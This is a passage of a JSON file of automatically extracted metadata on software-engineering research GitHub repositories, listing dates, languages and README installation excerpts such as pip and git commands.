                    "value": "```{code-block} text\n ____    ____    ____              ____\n/\\  _`\\ /\\  _`\\ /\\  _`\\           /\\  _`\\           __\n\\ \\,\\L\\_\\ \\ \\/\\ \\ \\ \\/\\_\\         \\ \\,\\L\\_\\    ___ /\\_\\    ____    ____    ___   _ __\n \\/_\\__ \\\\ \\ \\ \\ \\ \\ \\/_/_  _______\\/_\\__ \\   /'___\\/\\ \\  /',__\\  /',__\\  / __`\\/\\`'__\\\n   /\\ \\L\\ \\ \\ \\_\\ \\ \\ \\L\\ \\/\\______\\ /\\ \\L\\ \\/\\ \\__/\\ \\ \\/\\__, `\\/\\__, `\\/\\ \\L\\ \\ \\ \\/\n   \\ `\\____\\ \\____/\\ \\____/\\/______/ \\ `\\____\\ \\____\\\\ \\_\\/\\____/\\/\\____/\\ \\____/\\ \\_\\\n    \\/_____/\\/___/  \\/___/            \\/_____/\\/____/ \\/_/\\/___/  \\/___/  \\/___/  \\/_/\n\n\n```\n[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)\n[![Conventional Commits](https://img.shields.io/badge/Conventional%20Commits-1.0.0-%23FE5196?logo=conventionalcommits&logoColor=white)](https://conventionalcommits.org)\n[![GitHub issues](https://img.shields.io/github/issues/christianbirchler-org/sdc-scissor)](https://github.com/christianbirchler-org/sdc-scissor/issues)\n[![GitHub forks](https://img.shields.io/github/forks/christianbirchler-org/sdc-scissor)](https://github.com/christianbirchler-org/sdc-scissor/network)\n[![GitHub stars](https://img.shields.io/github/stars/christianbirchler-org/sdc-scissor)](https://github.com/christianbirchler-org/sdc-scissor/stargazers)\n[![](https://github.com/christianbirchler-org/sdc-scissor/actions/workflows/ci.yml/badge.svg)](https://github.com/christianbirchler-org/sdc-scissor/actions/workflows/ci.yml)\n[![PyPI](https://img.shields.io/pypi/v/sdc-scissor)](https://pypi.org/project/sdc-scissor/)\n[![](https://readthedocs.org/projects/sdc-scissor/badge)](https://sdc-scissor.readthedocs.io)\n[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://black.readthedocs.io/)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=alert_status)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=ncloc)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=coverage)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=sqale_index)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=reliability_rating)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=duplicated_lines_density)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=vulnerabilities)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=bugs)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=security_rating)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=sqale_rating)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![](https://sonarcloud.io/api/project_badges/measure?project=christianbirchler-org_sdc-scissor&metric=code_smells)](https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor)\n[![DOI](https://zenodo.org/badge/363107094.svg)](https://zenodo.org/badge/latestdoi/363107094)\n<div style=\"text-align: center;\">\n<a href=\"https://github.com/christianbirchler-org/sdc-scissor\">\n<img src=\"https://raw.githubusercontent.com/christianbirchler-org/sdc-scissor/main/docs/images/github_logo_icon.png\">\n</a>\n<a href=\"https://sonarcloud.io/summary/overall?id=christianbirchler-org_sdc-scissor\">\n<img src=\"https://sonarcloud.io/images/project_badges/sonarcloud-black.svg\">\n</a>\n</div>\n \n",
                    "original_header": "SDC-Scissor"
                },
                "confidence": 0.9999999999999432,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ChristianBirchler/sdc-scissor/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-30T10:32:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-04T21:06:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 293798
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 21482
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 14209
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 2715
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1379
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 359
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "168": {
        "filename": "michelnass_Similo2_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/michelnass/Similo2",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-02T16:41:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-07T10:53:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 53023
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 18620
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 109
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "169": {
        "filename": "Sushentsev_DapStep_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Sushentsev/DapStep",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "DapStep",
                        "How to use"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Sushentsev/DapStep/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-12-27T13:28:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-09T17:09:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 125286
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "170": {
        "filename": "M3SOulu_ESEM2018-Emoticons-Emotions-List_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/M3SOulu/ESEM2018-Emoticons-Emotions-List",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-08-31T08:53:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2018-10-11T11:09:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "171": {
        "filename": "jcohen02_rse-models_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jcohen02/rse-models",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-07-09T10:02:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2018-12-07T12:00:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "172": {
        "filename": "gabeorlanski_bimodal-code-generation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/gabeorlanski/bimodal-code-generation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Clone this repo with\n\n```shell\ngit clone https://github.com/gabeorlanski/springresearch.git\n```\n\n2. Install the requirements with\n\n```shell\npip install -r requirements.txt\n```\n\n3. Install these python libraries from their repositories:\n\n* [TaskIO](https://github.com/gabeorlanski/taskio)\n* [Apex](https://github.com/NVIDIA/apex)\n",
                    "type": "Text_excerpt",
                    "original_header": "Install Instructions"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/gabeorlanski/bimodal-code-generation/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-01T15:59:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-07-12T14:26:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 554657
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 479800
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 352350
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 14469
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 462
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 59
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "173": {
        "filename": "se2p_catnip_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/se2p/catnip",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "> Checkout with `git clone --recursive` to clone the `scratch-gui` and `whisker`\nsubmodules. \n",
                    "original_header": "Catnip"
                },
                "confidence": 0.9999995839959878,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/se2p/catnip/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-07T11:45:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-11T01:15:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Scala",
                    "name": "Scala",
                    "type": "Programming_language",
                    "size": 504909
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 46701
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 24549
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1410
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "174": {
        "filename": "KIT-IAI_EasyMLServe_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/KIT-IAI/EasyMLServe",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install the framework, simply use pip within this directory by calling `pip install .` or `pip install -e .` if you want to change the code and directly test it within your projects.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "EasyMLServe: Easy Deployment of REST Machine Learning Services"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/KIT-IAI/EasyMLServe/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-23T13:06:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-29T04:58:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 31535
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "175": {
        "filename": "RuYunW_ADG-Seq2Seq_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/RuYunW/ADG-Seq2Seq",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-05-14T22:10:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T10:16:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 54085
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "176": {
        "filename": "yinghuali_AIApp_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yinghuali/AIApp",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-06-20T10:01:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T22:04:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2672589
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 362
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "177": {
        "filename": "EngineeringSoftware_time-segmented-evaluation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/EngineeringSoftware/time-segmented-evaluation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Requires Anaconda/Miniconda, and the models' source code at `_work/src/`.\n\n```\npython -m tseval.main prepare_envs --which=$model_cls\n# Example: python -m tseval.main prepare_envs --which=TransformerACL20\n```\n\nWhere the `$model_cls` for each model can be looked up in this table\n(Transformer and Seq2Seq are using the same model class and\nenvironment):\n\n| $task | $model_cls         | Model         |\n|:------|:-------------------|:--------------|\n| CG    | DeepComHybridESE19 | DeepComHybrid |\n| CG    | TransformerACL20   | Transformer   |\n| CG    | TransformerACL20   | Seq2Seq       |\n| MN    | Code2VecPOPL19     | Code2Vec      |\n| MN    | Code2SeqICLR19     | Code2Seq      |\n\nThe name of the conda environment created is `tseval-$task-$model_cls`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Prepare the Python environments for ML models",
                    "parent_header": [
                        "Impact of Evaluation Methodologies on Code Summarization",
                        "Code for Training and Evaluating Models"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/time-segmented-evaluation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Requires the dataset at `_work/$task/setup/$method/`, and\nactivating the right conda environment\n(`conda activate tseval-$task-$model_cls`).\n```\npython -m tseval.main exp_train \\\n    --task=$task \\\n    --setup_name=$method \\\n    --model_name=$model_cls \\\n    --exp_name=$exp_name \\\n    --seed=$seed \\\n    $model_args\n# Example: python -m tseval.main exp_train \\\n#     --task=CG \\\n#     --setup_name=T \\\n#    --model_name=TransformerACL20 \\\n#    --exp_name=Transformer \\\n#    --seed=4182\n```\n \n",
                    "original_header": "Train ML models under a methodology"
                },
                "confidence": 0.9995136901614255,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/time-segmented-evaluation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Requires the dataset at `_work/$task/setup/$method/`, the trained\nmodel at `_work/$task/exp/$method/$exp_name/`, and activating the\nright conda environment (`conda activate tseval-$task-$model_cls`).\n```\nfor $action in val test_standard test_common; do\n    python -m tseval.main exp_eval \\\n        --task=$task \\\n        --setup_name=$method \\\n        --exp_name=$exp_name \\\n        --action=$action\ndone\n# Example: for $action in val test_standard test_common; do\n#    python -m tseval.main exp_eval \\\n#        --task=CG \\\n#        --setup_name=T \\\n#        --exp_name=Transformer \\\n#        --action=$action\n#done\n```\n \n",
                    "original_header": "Evaluate ML models"
                },
                "confidence": 0.9988459401605935,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/time-segmented-evaluation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Requires the evaluation results at\n`_work/$task/result/$method/$exp_name/`, and the use of `tseval`\nenvironment (`conda activate tseval`).\n```\nfor $action in val test_standard test_common; do\n    python -m tseval.main exp_compute_metrics \\\n        --task=$task \\\n        --setup_name=$method \\\n        --exp_name=$exp_name \\\n        --action=$action\ndone\n# Example: for $action in val test_standard test_common; do\n#    python -m tseval.main exp_compute_metrics \\\n#        --task=CG \\\n#        --setup_name=T \\\n#        --exp_name=Transformer \\\n#        --action=$action\n#done\n```\n \n[paper-arxiv]: https://arxiv.org/abs/2108.09619\n[paper-utcs]: https://www.cs.utexas.edu/users/ai-lab/downloadPublication.php?filename=http://www.cs.utexas.edu/users/ml/papers/nie.acl2022.pdf&pubid=127948\n \n",
                    "original_header": "Compute automatic metrics"
                },
                "confidence": 0.9854270086253287,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/time-segmented-evaluation/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-10T17:15:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-27T02:06:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 245906
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 39042
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 14320
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "178": {
        "filename": "AIG-ist-tugraz_DirectDebug_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/AIG-ist-tugraz/DirectDebug",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For further details on configuring these parameters, we refer to three example configuration files, **confForPaper.txt**, **conf1.1.txt**, **conf1.2.txt**. **confForPaper.txt** is used by **run.sh**, and two remaining files are used by **run_all.sh**.\n \n",
                    "original_header": "Construct Configuration files"
                },
                "confidence": 0.9998957972947213,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/AIG-ist-tugraz/DirectDebug/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-02T22:35:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-12-17T11:45:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 179030
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1644
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 128
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "179": {
        "filename": "askaratas_Feather_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/askaratas/Feather",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The executable jar file (i.e., feather.jar) needs SICStus Prolog native dll's to execute. The evaluation version (even if the trial period has expired) works. \r\n\r\nYou can download SICStus Prolog from: https://sicstus.sics.se/eval.html\r\n \n"
                },
                "confidence": 0.9998018877972229,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/askaratas/Feather/master/README.txt"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-03-16T16:43:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-19T18:46:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 702291
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "180": {
        "filename": "TRDDC-TUM_wcet-benchmarks_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TRDDC-TUM/wcet-benchmarks",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " - a subset of the M\u00e4lardalen WCET benchmarks, where the sources are annotated with instruction timing for Atmel Atmega microcontrollers\n - WCET estimate from the WCET analyzer Bound-T v4.5 (http://www.bound-t.com/)\n - WCET estimate from Model Checker CBMC v5.6 (http://www.cprover.org/cbmc/)\n - Timing of cycle-accurate simulation runs (http://www.nongnu.org/simulavr/) as a lower bound for WCET, i.e., to sanity-check the estimates\n \n",
                    "original_header": "What you can find here"
                },
                "confidence": 0.9817997297042519,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TRDDC-TUM/wcet-benchmarks/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " - runAllBoundT.sh: run Bound-T for all benchmarks\n - runAllCbmcParallel.sh: run cbmc in parallel for all benchmarks (processing time may be skewed)\n - runAllCbmc.sh: run cbmc sequentially for all benchmarks\n - runSomeCbmcParallel.sh: run cbmc only on some benchmarks, but in parallel (processing time may be skewed)\n - runSomeCbmc.sh: run cbmc sequentially and only on some benchmarks\n - .run-blacklist.sh: this file defines what shall not be run (e.g., you may want to exclude long-running benchmarks)\n - getResultsCbmc.py: create benchmarks/finder.log. Is called automatically in the end of the run scripts.\n \n",
                    "original_header": "Included Scripts"
                },
                "confidence": 0.9999988078749027,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TRDDC-TUM/wcet-benchmarks/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-04-11T14:49:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-04T01:20:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Assembly",
                    "name": "Assembly",
                    "type": "Programming_language",
                    "size": 9323361
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 1563980
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 231587
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 170775
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 115791
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 26102
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "181": {
        "filename": "Code-Rep_HELoC_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Code-Rep/HELoC",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " ```\n run python clo.py \\\n--data_path [The path to the dataset] \\\n--device ['cpu'/'cuda']\\\n--pre_model [The path of the pre_model]\\\n--pair_file [The path of the clone pairs]\n``` \n",
                    "original_header": "Code Clone Detection <br />"
                },
                "confidence": 0.9999867731266302,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Code-Rep/HELoC/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " ```\n run python clu.py \\\n --data_path [The path to the dataset]\\\n--device ['cpu'/'cuda']\\\n--pre_model [The path of the pre_model]\n``` \n",
                    "original_header": "Code Clustering <br />"
                },
                "confidence": 0.9995217876423609,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Code-Rep/HELoC/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-12-28T12:05:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-08T10:57:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3644424
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Tcl",
                    "name": "Tcl",
                    "type": "Programming_language",
                    "size": 24432
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PowerShell",
                    "name": "PowerShell",
                    "type": "Programming_language",
                    "size": 2934
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 2768
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "182": {
        "filename": "Wardat-ISU_DeepLocalize_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Wardat-ISU/DeepLocalize",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
